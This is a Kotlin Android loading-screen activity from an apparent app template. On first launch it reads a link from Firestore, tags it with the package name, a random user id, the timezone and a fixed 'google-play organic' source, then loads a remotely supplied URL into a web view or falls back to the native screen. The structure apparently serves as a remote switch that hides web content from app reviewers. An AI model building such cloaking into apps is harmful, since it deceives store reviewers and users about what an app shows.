package com.template

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import java.io.IOException
import java.util.*

class LoadingActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        readPreference()
    }

    private fun writePreference(text: String){
        getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE).apply {
            edit().apply{
                putString(URL_KEY, text)
                apply()
            }
        }
    }

    private fun readPreference(){
        val sharedPreference =  getSharedPreferences(PREFERENCE_NAME, Context.MODE_PRIVATE)
        when (val url = sharedPreference.getString(URL_KEY, FIRST_TIME)){
            FIRST_TIME -> getInFirebase()
            NO_DATA -> startMainActivity()
            else -> startWebActivity(url!!)
        }
    }

    private fun getInFirebase(){
        val db = Firebase.firestore
        db.collection("database")
            .get()
            .addOnSuccessListener { result ->
                val resultText = result.documents[0].data?.get("link")
                if (resultText?.equals("") == true){
                    writePreference(NO_DATA)
                    startMainActivity()
                }
                else {
                    val finalText = "$resultText/?packageid=$packageName&usserid=${UUID.randomUUID()}&getz=${TimeZone.getDefault().id}&getr=utm_source=google-play&utm_medium=organic"
                    writePreference(finalText)
                    getUrlFromWeb(finalText)
                }
            }
            .addOnFailureListener {
                writePreference(FIRST_TIME)
                startMainActivity()
            }
    }

    private fun startMainActivity(){
        startActivity(Intent(this, MainActivity::class.java))
    }

    private fun startWebActivity(url: String){
        startActivity(WebActivity.intentWebActivity(this, url))
    }

    private fun getUrlFromWeb(url: String)  {
        Thread {
            var res: Boolean
            var urlRes = ""
            try {
                res = true
                val doc: Document = Jsoup.connect(url).get()
                urlRes = doc.body().text()
                writePreference(urlRes)

            } catch (e: IOException) {
                res = false
                writePreference(NO_DATA)
            }
            runOnUiThread {
                if (res)
                    startWebActivity(urlRes)
                else
                    startMainActivity()
            }
        }.start()
    }

    companion object{
        const val URL_KEY = "url_key"
        const val NO_DATA = "no_data"
        const val FIRST_TIME = "first_time"
        const val PREFERENCE_NAME = "preference_name"
    }
}
